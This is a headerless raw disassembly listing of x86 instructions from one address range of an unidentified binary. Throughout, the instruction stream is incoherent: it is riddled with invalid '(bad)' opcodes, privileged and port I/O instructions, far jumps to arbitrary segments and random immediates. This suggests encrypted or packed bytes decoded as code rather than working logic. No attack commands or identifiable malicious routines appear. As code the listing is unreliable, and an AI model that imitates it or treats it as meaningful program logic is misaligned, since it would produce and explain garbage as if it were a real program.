  40ec22:	(bad)  
  40ec23:	imul   edi,esi,0xf6ac7678
  40ec29:	push   es
  40ec2a:	sub    ebx,DWORD PTR [di+0x16]
  40ec2e:	push   ss
  40ec2f:	(bad)  
  40ec30:	push   edx
  40ec31:	leave  
  40ec32:	adc    DWORD PTR [edi-0xfa63a56],ebx
  40ec38:	mov    fs,WORD PTR gs:0x27e95a3
  40ec3f:	das    
  40ec40:	cld    
  40ec41:	mov    BYTE PTR [ebx],dh
  40ec43:	aaa    
  40ec44:	or     BYTE PTR [esi+ebx*1-0x122e0ff8],dh
  40ec4b:	sub    DWORD PTR [ecx+0x5fee9fd7],edx
  40ec51:	mov    esp,0x7a4d8f0f
  40ec56:	fiadd  WORD PTR [ebp+0x5]
  40ec59:	jge    0x40ec92
  40ec5b:	xchg   edx,eax
  40ec5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec5d:	(bad)  [esi+edi*1-0x4b3fb494]
  40ec64:	aas    
  40ec65:	jge    0x40ecc5
  40ec67:	mov    bh,0xc8
  40ec69:	jne    0x40ec11
  40ec6b:	lods   al,BYTE PTR ds:[esi]
  40ec6c:	mov    ebp,?
  40ec6e:	dec    ebx
  40ec6f:	jge    0x40ecc4
  40ec71:	ins    DWORD PTR es:[edi],dx
  40ec72:	pop    edx
  40ec73:	pop    ebx
  40ec74:	inc    edi
  40ec75:	shl    BYTE PTR [ebx],cl
  40ec77:	lahf   
  40ec78:	pop    ebp
  40ec79:	push   eax
  40ec7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec7b:	xor    al,0xf9
  40ec7d:	cli    
  40ec7e:	dec    ebx
  40ec7f:	adc    eax,0xb99272cf
  40ec84:	add    dh,BYTE PTR [ecx]
  40ec86:	add    BYTE PTR [ecx],dl
  40ec88:	and    DWORD PTR [edi],ebp
  40ec8a:	xchg   esi,eax
  40ec8b:	arpl   WORD PTR [edx+0x770ee6b6],si
  40ec91:	repz lds ebp,FWORD PTR [ecx-0x4729e00]
  40ec98:	adc    eax,0xf92ef8b7
  40ec9d:	sub    BYTE PTR [esi+0x16],al
  40eca0:	addr16 sub eax,esi
  40eca3:	cdq    
  40eca4:	test   BYTE PTR [esi+0x4432ceb],bl
  40ecaa:	popf   
  40ecab:	int    0x3c
  40ecad:	dec    esp
  40ecae:	inc    esp
  40ecb0:	inc    eax
  40ecb1:	jl     0x40ed0d
  40ecb3:	es pop es
  40ecb5:	mov    esi,0xd7e1cac3
  40ecba:	push   eax
  40ecbb:	mov    ch,ah
  40ecbd:	push   esi
  40ecbe:	in     al,0xe7
  40ecc0:	stc    
  40ecc1:	and    bh,BYTE PTR [ebx-0x3344495b]
  40ecc7:	cmp    DWORD PTR [edi+edx*1+0x65],ebx
  40eccb:	shl    esp,0x7d
  40ecce:	mov    eax,ds:0xf9f5dfdf
  40ecd3:	popf   
  40ecd4:	mov    cl,0x7e
  40ecd6:	and    bh,BYTE PTR [ecx+eiz*4]
  40ecd9:	pop    es
  40ecda:	mov    ebp,0x62d2d367
  40ecdf:	fwait
  40ece0:	jecxz  0x40ece0
  40ece2:	(bad)  
  40ece3:	into   
  40ece4:	pop    ds
  40ece5:	mov    edi,0x801ff7c7
  40ecea:	xchg   edi,eax
  40eceb:	stos   DWORD PTR es:[edi],eax
  40ecec:	out    0xb3,al
  40ecee:	xchg   esi,eax
  40ecef:	inc    ebp
  40ecf0:	or     ecx,DWORD PTR [ecx+0x8]
  40ecf3:	xchg   esp,eax
  40ecf4:	jecxz  0x40ec87
  40ecf6:	push   0xc
  40ecf8:	in     al,dx
  40ecf9:	ret    
  40ecfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecfb:	sbb    eax,0x23fba058
  40ed00:	loope  0x40ed1e
  40ed02:	sar    dh,cl
  40ed04:	scas   eax,DWORD PTR es:[edi]
  40ed05:	dec    ebx
  40ed06:	pushf  
  40ed07:	push   ds
  40ed08:	xor    eax,DWORD PTR [esi+0x442a5568]
  40ed0e:	jg     0x40ed16
  40ed10:	psrad  mm2,QWORD PTR [esi+0x62]
  40ed14:	push   0x22
  40ed16:	aam    0x8d
  40ed18:	lock ret 
  40ed1a:	je     0x40ece1
  40ed1c:	mov    eax,ds:0x5df291f5
  40ed21:	pop    ebp
  40ed22:	les    ebp,FWORD PTR [eax+eax*8+0x3c]
  40ed26:	sub    eax,ecx
  40ed28:	xor    DWORD PTR [edi+0x439c94a],esp
  40ed2e:	aad    0xf0
  40ed30:	iret   
  40ed31:	or     BYTE PTR [eax-0x19],cl
  40ed34:	stos   BYTE PTR es:[edi],al
  40ed35:	cmp    edi,esi
  40ed37:	call   0x1b5c:0x2a92c2e6
  40ed3e:	outs   dx,DWORD PTR ds:[esi]
  40ed3f:	cwde   
  40ed40:	(bad)  
  40ed41:	les    ebx,FWORD PTR [eax]
  40ed43:	les    esi,FWORD PTR [ebx+0x310e41a8]
  40ed49:	test   edi,eax
  40ed4b:	push   edi
  40ed4c:	mov    ds:0x88f00b2e,eax
  40ed51:	daa    
  40ed52:	jb     0x40ed17
  40ed54:	dec    ecx
  40ed55:	add    al,0x12
  40ed57:	(bad)  
  40ed58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed59:	mov    eax,ds:0x629cdd86
  40ed5e:	int3   
  40ed5f:	mov    bh,0x54
  40ed61:	stc    
  40ed62:	add    DWORD PTR [ebx+ecx*2+0x79],edi
  40ed66:	push   0x5a
  40ed68:	push   esi
  40ed69:	pop    edi
  40ed6a:	ins    BYTE PTR es:[edi],dx
  40ed6b:	jl     0x40eda6
  40ed6d:	mov    BYTE PTR [ecx-0x39],dh
  40ed70:	(bad)  
  40ed71:	jmp    0xe0b8:0x586d096e
  40ed78:	xchg   esi,eax
  40ed79:	add    BYTE PTR [edi-0x656f55bb],bh
  40ed7f:	fs int 0x9c
  40ed82:	push   eax
  40ed83:	mov    esi,0x73e52d72
  40ed88:	jb     0x40edd2
  40ed8a:	(bad)  
  40ed8b:	hlt    
  40ed8c:	xchg   edx,eax
  40ed8d:	dec    esp
  40ed8e:	fwait
  40ed8f:	or     al,0x55
  40ed91:	sar    BYTE PTR [eax-0x2c],1
  40ed94:	sahf   
  40ed95:	jns    0x40eda3
  40ed97:	xor    DWORD PTR [eax],esi
  40ed99:	stc    
  40ed9a:	sbb    ecx,ebx
  40ed9c:	mov    dl,0x8
  40ed9e:	mov    WORD PTR [esi-0x36],?
  40eda1:	nop
  40eda2:	mov    ecx,0xab6a58c7
  40eda7:	dec    ecx
  40eda8:	mov    dl,0xd3
  40edaa:	inc    ebx
  40edab:	iret   
  40edac:	loopne 0x40ed54
  40edae:	bound  eax,QWORD PTR [ecx+0x62]
  40edb1:	in     eax,dx
  40edb2:	mov    WORD PTR [edx+0x35a17ea1],cs
  40edb8:	into   
  40edb9:	mov    cl,dh
  40edbb:	inc    eax
  40edbc:	pop    eax
  40edbd:	dec    eax
  40edbe:	loope  0x40edc6
  40edc0:	cmp    eax,0xc62b5653
  40edc5:	lds    edx,FWORD PTR [edi+0x37193412]
  40edcb:	jno    0x40ed84
  40edcd:	fwait
  40edce:	cmp    al,0x2
  40edd0:	jbe    0x40edb5
  40edd2:	shl    edx,1
  40edd4:	lahf   
  40edd5:	cmp    BYTE PTR [edx+0x7e],0x57
  40edd9:	test   esp,ebp
  40eddb:	int3   
  40eddc:	ja     0x40ed94
  40edde:	mov    ecx,0x60b791bf
  40ede3:	in     eax,0x73
  40ede5:	jmp    0x752b:0xfaeeae24
  40edec:	adc    al,0x6b
  40edee:	into   
  40edef:	xchg   edi,eax
  40edf0:	mov    ah,0xce
  40edf2:	pop    esp
  40edf3:	(bad)  
  40edf4:	sar    BYTE PTR [edx],1
  40edf6:	cmp    al,0x99
  40edf8:	fidivr DWORD PTR [ebx+eax*2+0x63845d77]
  40edff:	push   esi
  40ee00:	or     ebx,DWORD PTR [esp+ebp*8]
  40ee03:	(bad)  
  40ee04:	fdivr  st(3),st
  40ee06:	xchg   edx,eax
  40ee07:	retf   
  40ee08:	mov    cl,0x88
  40ee0a:	and    bl,dl
  40ee0c:	mov    eax,ds:0x20976834
  40ee11:	gs pusha 
  40ee13:	in     eax,dx
  40ee14:	scas   al,BYTE PTR es:[edi]
  40ee15:	pushf  
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	fpatan 
  40ee19:	inc    esp
  40ee1a:	inc    ebx
  40ee1b:	ss data16 icebp 
  40ee1e:	sbb    esi,esi
  40ee20:	sub    cl,BYTE PTR [edi+0xb863738]
  40ee26:	mov    al,ds:0xb50edbef
  40ee2b:	xchg   esp,eax
  40ee2c:	mov    ecx,esp
  40ee2e:	ds icebp 
  40ee30:	mov    ch,0x9b
  40ee32:	fdiv   QWORD PTR [eax+0x422129d4]
  40ee38:	mov    al,BYTE PTR [edi+0x44]
  40ee3b:	dec    eax
  40ee3c:	mov    ah,0x15
  40ee3e:	sbb    al,0x36
  40ee40:	dec    ebp
  40ee41:	push   edx
  40ee42:	test   al,0xb
  40ee44:	dec    ebx
  40ee45:	std    
  40ee46:	fldcw  WORD PTR [esp+ebp*1]
  40ee49:	jmp    0x40edf9
  40ee4b:	sub    ax,0xf6ca
  40ee4f:	das    
  40ee50:	fnstcw WORD PTR [esp+ebx*4+0x56]
  40ee54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee55:	cmc    
  40ee56:	mov    ds:0x4fe3034d,al
  40ee5b:	aam    0xde
  40ee5d:	cmc    
  40ee5e:	(bad)  
  40ee5f:	lahf   
  40ee60:	sub    eax,0x3da44251
  40ee65:	or     eax,0x72300e33
  40ee6a:	cmp    DWORD PTR [edi-0x62],esi
  40ee6d:	mov    eax,ds:0x1f5f5677
  40ee72:	pop    ds
  40ee73:	or     DWORD PTR [esi],esp
  40ee75:	mov    bh,0xf2
  40ee77:	jg     0x40eecf
  40ee79:	outs   dx,DWORD PTR ds:[esi]
  40ee7a:	aad    0xb1
  40ee7c:	outs   dx,DWORD PTR ds:[esi]
  40ee7d:	shr    DWORD PTR [esi],0x87
  40ee80:	and    BYTE PTR [edi-0x642de3f9],dl
  40ee86:	adc    al,0x42
  40ee88:	es ret 0x1481
  40ee8c:	xor    al,0x8a
  40ee8e:	int    0x92
  40ee90:	add    dl,BYTE PTR [eax-0x3a169f3f]
  40ee96:	test   al,0x23
  40ee98:	jge    0x40ee67
  40ee9a:	add    DWORD PTR [esi+0x764f545f],ecx
  40eea0:	xchg   dh,dl
  40eea2:	cdq    
  40eea3:	data16 mov al,ds:0x35ed6397
  40eea9:	lods   eax,DWORD PTR ds:[esi]
  40eeaa:	in     al,dx
  40eeab:	adc    al,0x16
  40eead:	lahf   
  40eeae:	es cmp al,0xce
  40eeb1:	cdq    
  40eeb2:	sar    BYTE PTR [eax],1
  40eeb4:	mov    ds:0x1fb3c212,eax
  40eeb9:	sbb    ebp,DWORD PTR [edi]
  40eebb:	or     DWORD PTR [edi-0x731da427],ecx
  40eec1:	xor    DWORD PTR [esi+0x5a],edx
  40eec4:	inc    ebx
  40eec5:	rcr    BYTE PTR ds:0x53342afb,1
  40eecb:	and    al,0x94
  40eecd:	push   ss
  40eece:	push   0x4
  40eed0:	popf   
  40eed1:	fsub   st,st(6)
  40eed3:	andps  xmm4,XMMWORD PTR es:[esi-0x3a972b44]
  40eedb:	mov    ah,0xd5
  40eedd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eede:	pop    ss
  40eedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eee0:	stos   DWORD PTR es:[edi],eax
  40eee1:	push   eax
  40eee2:	adc    esi,DWORD PTR [esp+eax*2]
  40eee5:	push   0x73cf1990
  40eeea:	add    BYTE PTR [edx+0x210e459f],al
  40eef0:	jnp    0x40eef4
  40eef2:	jg     0x40ee78
  40eef4:	data16 jle 0x40ee7d
  40eef7:	xchg   esp,eax
  40eef8:	and    BYTE PTR [ebx],0xa7
  40eefb:	loopne 0x40ef64
  40eefd:	int3   
  40eefe:	sti    
  40eeff:	data16 add al,0x0
  40ef02:	add    al,0x19
  40ef04:	std    
  40ef05:	push   cs
  40ef06:	push   esp
  40ef07:	fld    TBYTE PTR [ebx-0x26]
  40ef0a:	push   esi
  40ef0b:	rcr    DWORD PTR [esi+0x7a],cl
  40ef0e:	cmc    
  40ef0f:	into   
  40ef10:	sbb    dh,ch
  40ef12:	push   ss
  40ef13:	nop
  40ef14:	add    ebx,ecx
  40ef16:	lock ret 0x32fd
  40ef1a:	sub    DWORD PTR [edx+0x4888091e],0xffffffd1
  40ef21:	or     al,0x3
  40ef23:	add    dl,0xfb
  40ef26:	dec    ebx
  40ef27:	call   DWORD PTR fs:0x9028693e
  40ef2e:	(bad)  
  40ef2f:	(bad)  
  40ef30:	cmp    eax,0xf68e76fd
  40ef35:	repnz cmp dl,ah
  40ef38:	rol    BYTE PTR [edx-0xf],1
  40ef3b:	mov    bl,0xd2
  40ef3d:	push   edi
  40ef3e:	mov    DWORD PTR [esi],eax
  40ef40:	pop    ecx
  40ef41:	inc    ecx
  40ef42:	rcl    DWORD PTR ds:0x436bf90,0xbe
  40ef49:	lds    ebp,FWORD PTR [eax-0x44]
  40ef4c:	cmp    BYTE PTR [edx],bh
  40ef4e:	int    0x1
  40ef50:	call   0xf97:0xfce36c63
  40ef57:	aad    0x40
  40ef59:	xchg   edx,eax
  40ef5a:	cmp    ah,bl
  40ef5c:	or     eax,0x8a69b669
  40ef61:	mov    WORD PTR [esi+0x71],?
  40ef64:	or     al,0x8a
  40ef66:	(bad)  
  40ef67:	loope  0x40ef0e
  40ef69:	fdivr  st,st(6)
  40ef6b:	idiv   DWORD PTR [edx-0x66]
  40ef6e:	jnp    0x40ef5a
  40ef70:	mov    ds:0xed8a8d37,al
  40ef75:	xchg   ecx,eax
  40ef76:	push   ebx
  40ef77:	jb     0x40efd0
  40ef79:	jbe    0x40ef34
  40ef7b:	enter  0x615f,0x14
  40ef7f:	int3   
  40ef80:	sub    DWORD PTR [eax],ebp
  40ef82:	jmp    0x3383eb09
  40ef87:	fcom   QWORD PTR [ecx]
  40ef89:	push   eax
  40ef8a:	jns    0x40ef37
  40ef8c:	fnstcw WORD PTR [edx+0x3b12e04c]
  40ef92:	sbb    eax,0x4a7c1dc1
  40ef97:	push   edx
  40ef98:	dec    ebx
  40ef99:	leave  
  40ef9a:	outs   dx,BYTE PTR ds:[esi]
  40ef9b:	nop
  40ef9c:	js     0x40ef22
  40ef9e:	and    eax,0x3222a97a
  40efa3:	stos   BYTE PTR es:[edi],al
  40efa4:	ror    BYTE PTR [eax],1
  40efa6:	(bad)  
  40efa8:	add    edx,DWORD PTR [ebx]
  40efaa:	arpl   WORD PTR [ebp+0x5f],cx
  40efad:	add    ah,cl
  40efaf:	sub    BYTE PTR [ecx-0x7b],bl
  40efb2:	les    esp,FWORD PTR [edx]
  40efb4:	and    BYTE PTR [eax],dl
  40efb6:	loopne 0x40efc2
  40efb8:	test   eax,0x389ec1c6
  40efbd:	stos   DWORD PTR es:[edi],eax
  40efbe:	ror    BYTE PTR [edi],cl
  40efc0:	inc    eax
  40efc1:	enter  0xea3d,0x5d
  40efc5:	call   0xbf486960
  40efca:	add    DWORD PTR [esp+ebp*8+0x3],0xffffff9c
  40efcf:	mov    dl,0xec
  40efd1:	xor    ah,dh
  40efd3:	cmp    al,0xb4
  40efd5:	xchg   esp,eax
  40efd6:	cmp    esp,DWORD PTR [eax+0x7b]
  40efd9:	push   ebp
  40efda:	xchg   BYTE PTR [edx+0x29],ch
  40efdd:	add    cl,BYTE PTR [esi]
  40efdf:	adc    ebp,DWORD PTR ds:0x3d671d0b
  40efe5:	out    dx,eax
  40efe6:	add    ch,BYTE PTR [eax+0x2a]
  40efe9:	leave  
  40efea:	(bad)  
  40efeb:	iret   
  40efec:	mov    eax,ds:0xbc719ccb
  40eff1:	sbb    eax,DWORD PTR [ebx]
  40eff3:	aaa    
  40eff4:	clc    
  40eff5:	inc    edi
  40eff6:	pop    ss
  40eff7:	(bad)  
  40eff8:	and    ebp,edx
  40effa:	and    ah,BYTE PTR [edx+0x18]
  40effd:	and    edx,edx
  40efff:	pop    ds
  40f000:	cwde   
  40f001:	in     al,0x61
  40f003:	mov    eax,ds:0xc175f675
  40f008:	dec    edi
  40f009:	bound  esi,QWORD PTR [ecx]
  40f00b:	xor    bl,ch
  40f00d:	ret    
  40f00e:	sbb    ecx,edx
  40f010:	sti    
  40f011:	icebp  
  40f012:	mov    dh,0x8f
  40f014:	inc    edi
  40f015:	sahf   
  40f016:	jp     0x40f032
  40f018:	icebp  
  40f019:	and    DWORD PTR [edi-0x50a6352],eax
  40f01f:	imul   BYTE PTR [ecx-0x19b485f0]
  40f025:	mov    dl,0x32
  40f027:	jecxz  0x40efeb
  40f029:	out    0x72,al
  40f02b:	(bad)  
  40f02d:	sub    eax,ebx
  40f02f:	bound  ecx,QWORD PTR [eax]
  40f031:	add    eax,0xf8d21e7e
  40f036:	pop    ds
  40f037:	rcr    DWORD PTR [esi+0x117b001c],0xe1
  40f03e:	add    al,0x9f
  40f040:	push   edi
  40f041:	jge    0x40f0af
  40f043:	(bad)  
  40f044:	outs   dx,DWORD PTR ds:[esi]
  40f045:	in     al,0x40
  40f047:	and    al,BYTE PTR [ebp+0x25163266]
  40f04d:	je     0x40f0cc
  40f04f:	or     DWORD PTR [edx+0x29],esi
  40f052:	cdq    
  40f053:	(bad)  
  40f054:	in     eax,dx
  40f055:	js     0x40f097
  40f057:	xchg   edx,eax
  40f058:	and    dl,dh
  40f05a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f05b:	inc    esi
  40f05c:	jmp    0x40f0da
  40f05e:	iret   
  40f05f:	lods   eax,DWORD PTR ds:[esi]
  40f060:	cmp    ebp,DWORD PTR [ecx]
  40f062:	xchg   ebp,eax
  40f063:	inc    edx
  40f064:	imul   eax,DWORD PTR [edx-0x1fb21fee],0x31af769d
  40f06e:	pop    edi
  40f06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f070:	out    0x76,al
  40f072:	add    al,BYTE PTR [eax]
  40f074:	cwde   
  40f075:	scas   eax,DWORD PTR es:[edi]
  40f076:	sbb    BYTE PTR [eax+0x3f86fca1],ah
  40f07c:	retf   
  40f07d:	cli    
  40f07e:	or     bh,BYTE PTR [edx]
  40f080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f081:	mov    ebp,0x485349f
  40f086:	adc    bl,BYTE PTR [esi+0x4d38ff4b]
  40f08c:	dec    esi
  40f08d:	or     eax,0x8e946bd4
  40f092:	jle    0x40f032
  40f094:	(bad)  
  40f095:	push   ebx
  40f096:	fstp   DWORD PTR [ebp+0x61a1ad5]
  40f09c:	push   edx
  40f09d:	shl    DWORD PTR [ebx-0xfb7d06b],cl
  40f0a3:	cmp    al,0x32
  40f0a5:	push   ds
  40f0a6:	fwait
  40f0a7:	push   0xa2a5a685
  40f0ac:	ror    DWORD PTR [edx+0x1e1770a4],1
  40f0b2:	push   esp
  40f0b3:	jl     0x40f0af
  40f0b5:	mov    al,0x8
  40f0b7:	popf   
  40f0b8:	call   0xdce6:0x7e805c14
  40f0bf:	test   DWORD PTR [ebp+ebx*4+0x43],esp
  40f0c3:	add    BYTE PTR [edi],bl
  40f0c5:	pop    es
  40f0c6:	jge    0x40f078
  40f0c8:	std    
  40f0c9:	pop    ebp
  40f0ca:	in     al,0x7f
  40f0cc:	imul   BYTE PTR [ecx+0x41918a68]
  40f0d2:	ret    
  40f0d3:	arpl   WORD PTR [edx+eiz*1+0x79],bp
  40f0d7:	bound  eax,QWORD PTR ds:0xbba0ff7b
  40f0dd:	test   eax,0x7890dc69
  40f0e2:	test   DWORD PTR [eax],ecx
  40f0e4:	jecxz  0x40f0f0
  40f0e6:	cli    
  40f0e7:	lahf   
  40f0e8:	ret    
  40f0e9:	xchg   edx,eax
  40f0ea:	es pop ecx
  40f0ec:	pop    ss
  40f0ed:	mov    edi,0xce2c5d58
  40f0f2:	rcr    ebx,0xa3
  40f0f5:	inc    edx
  40f0f6:	sub    DWORD PTR [ecx-0x37],esp
  40f0f9:	and    al,0xf4
  40f0fb:	loopne 0x40f08b
  40f0fd:	jno    0x40f13d
  40f0ff:	cmp    DWORD PTR [ebx+0x3c],eax
  40f102:	adc    bl,dl
  40f104:	outs   dx,BYTE PTR ds:[esi]
  40f105:	sti    
  40f106:	xchg   BYTE PTR [esi+0x4],bl
  40f109:	jo     0x40f0f1
  40f10b:	daa    
  40f10c:	test   DWORD PTR cs:[edi],0xabde4887
  40f113:	in     al,0x2e
  40f115:	fimul  WORD PTR ss:[edi-0x36]
  40f119:	jge    0x40f128
  40f11b:	jb     0x40f0d9
  40f11d:	rol    BYTE PTR [edi+0x9],1
  40f120:	ficom  DWORD PTR [ebx-0x20cab47b]
  40f126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f127:	sub    BYTE PTR [ebp-0x2e],dh
  40f12a:	and    al,BYTE PTR [esi+0x26]
  40f12d:	jle    0x40f0d4
  40f12f:	stos   DWORD PTR es:[edi],eax
  40f130:	icebp  
  40f131:	inc    esi
  40f132:	pop    ecx
  40f133:	out    dx,al
  40f134:	sti    
  40f135:	sbb    edi,edi
  40f137:	stc    
  40f138:	xor    al,0xdf
  40f13a:	lods   eax,DWORD PTR ds:[esi]
  40f13b:	aas    
  40f13c:	xchg   ecx,eax
  40f13d:	jp     0x40f0de
  40f13f:	jns    0x40f110
  40f141:	cdq    
  40f142:	mov    ah,0xf6
  40f144:	fiadd  WORD PTR [ebp-0x70db7de3]
  40f14a:	int3   
  40f14b:	inc    ecx
  40f14c:	not    DWORD PTR [edx+0x17]
  40f14f:	xor    esp,eax
  40f151:	xchg   edi,eax
  40f152:	sbb    al,0xa
  40f154:	(bad)  
  40f156:	adc    al,0xd5
  40f158:	sub    DWORD PTR [edi+0x33],0x4f
  40f15c:	sub    ebx,esi
  40f15e:	push   edx
  40f15f:	xor    bl,BYTE PTR [eax+0x66391287]
  40f165:	jnp    0x40f1bb
  40f167:	retf   
  40f168:	or     al,0x7b
  40f16a:	push   edi
  40f16b:	lods   eax,DWORD PTR ds:[esi]
  40f16c:	aas    
  40f16d:	mov    esp,0xf9f4b791
  40f172:	mov    ds:0x58c0c114,eax
  40f177:	mov    cl,0x38
  40f179:	loope  0x40f1a7
  40f17b:	xlat   BYTE PTR ds:[ebx]
  40f17c:	dec    ebx
  40f17d:	pop    esi
  40f17e:	mov    eax,DWORD PTR [edi-0x50]
  40f181:	mov    ds:0x42fc952,al
  40f186:	daa    
  40f187:	jl     0x40f163
  40f189:	sub    ebx,DWORD PTR [esi]
  40f18b:	(bad)  
  40f18c:	cmp    bl,cl
  40f18e:	push   ebx
  40f18f:	std    
  40f190:	xchg   edi,eax
  40f191:	dec    esi
  40f192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f193:	adc    DWORD PTR [ebx+0x9],edx
  40f196:	mov    eax,0x54dfd076
  40f19b:	sbb    BYTE PTR ds:0xca2d5c59,0x3a
  40f1a2:	fsubr  QWORD PTR [eax+edi*4]
  40f1a5:	fmul   st(2),st
  40f1a7:	xor    DWORD PTR [esp+ebx*4-0x291a201e],ebx
  40f1ae:	es xchg edx,eax
  40f1b0:	sbb    al,0xae
  40f1b2:	sub    al,BYTE PTR [edi+ecx*2-0x70]
  40f1b6:	adc    DWORD PTR [ecx-0x72],ebx
  40f1b9:	or     eax,0x7d90714d
  40f1be:	pop    ebx
  40f1bf:	enter  0xba99,0x5a
  40f1c3:	cmp    DWORD PTR [eax*4-0x407b10c2],esi
  40f1ca:	or     ch,BYTE PTR [ebx+0x7ff72a42]
  40f1d0:	push   ecx
  40f1d1:	jge    0x40f190
  40f1d3:	jne    0x40f168
  40f1d5:	shl    ah,1
  40f1d7:	add    edx,eax
  40f1d9:	pop    edx
  40f1da:	push   ecx
  40f1db:	or     esp,DWORD PTR [edi-0x49]
  40f1de:	call   0x397a1b1d
  40f1e3:	mov    edx,0x88152927
  40f1e8:	repnz ss ins DWORD PTR es:[edi],dx
  40f1eb:	bound  edi,QWORD PTR [ecx-0x7f3d2c6c]
  40f1f1:	test   al,0x1
  40f1f3:	gs xchg ebp,eax
  40f1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1f6:	sub    eax,0xa8fb94fe
  40f1fb:	mov    edx,0x2fcf74bf
  40f200:	dec    edi
  40f201:	xchg   edx,eax
  40f202:	cwde   
  40f203:	in     eax,dx
  40f204:	sub    eax,0xaf0a26c0
  40f209:	pop    ebp
  40f20a:	dec    eax
  40f20b:	lea    esp,[eax+eiz*8-0x5f]
  40f20f:	sbb    BYTE PTR ds:0xfc170e5d,dl
  40f215:	shl    BYTE PTR [eax-0x4],1
  40f218:	scas   eax,DWORD PTR es:[edi]
  40f219:	add    dh,ah
  40f21b:	inc    esp
  40f21c:	jg     0x40f1b0
  40f21e:	inc    eax
  40f21f:	inc    ecx
  40f220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f221:	push   ss
  40f222:	cmp    dh,BYTE PTR [eax+0x49]
  40f225:	imul   ebp,DWORD PTR ds:0xd644ca79,0xaa9660cf
  40f22f:	or     ch,BYTE PTR [esi+eax*2-0x239f9b43]
  40f236:	aas    
  40f237:	dec    DWORD PTR [esi-0x26ae17a8]
  40f23d:	lods   al,BYTE PTR ds:[esi]
  40f23e:	jl     0x40f2bd
  40f240:	cmp    BYTE PTR [ebx+ebx*4-0x5e09ead7],bl
  40f247:	cmc    
  40f248:	cmp    eax,0x3814827c
  40f24d:	fwait
  40f24e:	sbb    BYTE PTR [edi],al
  40f250:	idiv   esi
  40f252:	clc    
  40f253:	enter  0x13a0,0x4b
  40f257:	add    al,0xdb
  40f259:	dec    ebx
  40f25a:	out    dx,eax
  40f25b:	jmp    FWORD PTR [esi+0x4fdb0d9f]
  40f261:	xchg   edi,eax
  40f262:	mov    WORD PTR [eax],fs
  40f264:	fucompp 
  40f266:	(bad)  
  40f267:	(bad)  
  40f268:	int3   
  40f269:	jle    0xde749740
  40f26f:	mov    ecx,edi
  40f271:	sub    BYTE PTR [eax-0x25de0442],al
  40f277:	and    BYTE PTR [ecx-0x1da542ca],bh
  40f27d:	xchg   esi,eax
  40f27e:	inc    edi
  40f27f:	and    al,0xf5
  40f281:	cmp    al,0x7a
  40f283:	pop    ecx
  40f284:	xor    al,0x4d
  40f286:	mov    edx,0x30f38e6
  40f28b:	mov    ds:0x2f5dd6ea,eax
  40f290:	das    
  40f291:	loopne 0x40f27e
  40f293:	out    0xd5,al
  40f295:	adc    al,0x57
  40f297:	xor    eax,0xb09353c1
  40f29c:	inc    ebp
  40f29d:	push   ebx
  40f29e:	imul   ecx,DWORD PTR [esi-0x39],0x2b
  40f2a2:	pop    esp
  40f2a3:	dec    esi
  40f2a4:	cmp    cl,dh
  40f2a6:	inc    ebx
  40f2a7:	pop    esi
  40f2a8:	pinsrw mm1,WORD PTR [edx+ebp*2+0x580274b0],0xd8
  40f2b1:	jl     0x40f259
  40f2b3:	jecxz  0x40f278
  40f2b5:	pop    eax
  40f2b6:	lods   eax,DWORD PTR ds:[esi]
  40f2b7:	add    esp,edx
  40f2b9:	inc    eax
  40f2ba:	test   DWORD PTR [edi-0x80],0x1e583242
  40f2c1:	jnp    0x40f2a9
  40f2c3:	dec    eax
  40f2c4:	(bad)  
  40f2c5:	jnp    0x40f25d
  40f2c7:	sub    ecx,DWORD PTR [edi-0xc609f3b]
  40f2cd:	sbb    al,0xf9
  40f2cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2d0:	jnp    0x40f25a
  40f2d2:	jbe    0x40f2aa
  40f2d4:	fwait
  40f2d5:	sub    eax,0xe012d165
  40f2da:	adc    eax,0x8b43e764
  40f2df:	aam    0x96
  40f2e1:	sub    al,0xa8
  40f2e3:	inc    edi
  40f2e4:	mov    esi,0xbba5e446
  40f2e9:	(bad)  
  40f2ea:	in     al,0x8c
  40f2ec:	push   es
  40f2ed:	or     al,0x3c
  40f2ef:	mov    eax,0x8f3873fa
  40f2f4:	aad    0x98
  40f2f6:	push   edi
  40f2f7:	ja     0x40f292
  40f2f9:	pop    ds
  40f2fa:	jns    0x40f326
  40f2fc:	out    dx,eax
  40f2fd:	adc    cl,ah
  40f2ff:	pushf  
  40f300:	cdq    
  40f301:	sub    ebx,eax
  40f303:	loopne 0x40f2f4
  40f305:	sub    eax,0x2514c2bb
  40f30a:	int    0xb6
  40f30c:	dec    ebx
  40f30d:	mov    esi,0x252b18e7
  40f312:	in     eax,dx
  40f313:	fsubr  QWORD PTR [ebx]
  40f315:	sbb    DWORD PTR [ecx-0x70],esp
  40f318:	push   cs
  40f319:	test   al,0xcd
  40f31b:	lds    edi,FWORD PTR [esi]
  40f31d:	iret   
  40f31e:	mov    edi,0xc538798f
  40f323:	jmp    0xf0ea00dd
  40f328:	mov    eax,0x8f4bc023
  40f32d:	inc    ecx
  40f32e:	sbb    eax,0x24c10e69
  40f333:	daa    
  40f334:	fimul  DWORD PTR [ebx+0x5e50e4c9]
  40f33a:	call   0x6ce:0x4fae51e2
  40f341:	cwde   
  40f342:	cmp    BYTE PTR [ecx-0x34344a2],bl
  40f348:	rcr    DWORD PTR [ecx],0x7d
  40f34b:	push   ebx
  40f34c:	xchg   DWORD PTR [edi+0x7cc3eab7],ebp
  40f352:	cli    
  40f353:	push   ecx
  40f354:	cmp    DWORD PTR [esi-0x6939d451],ebp
  40f35a:	push   esp
  40f35b:	jecxz  0x40f379
  40f35d:	clc    
  40f35e:	stc    
  40f35f:	mov    ah,0x94
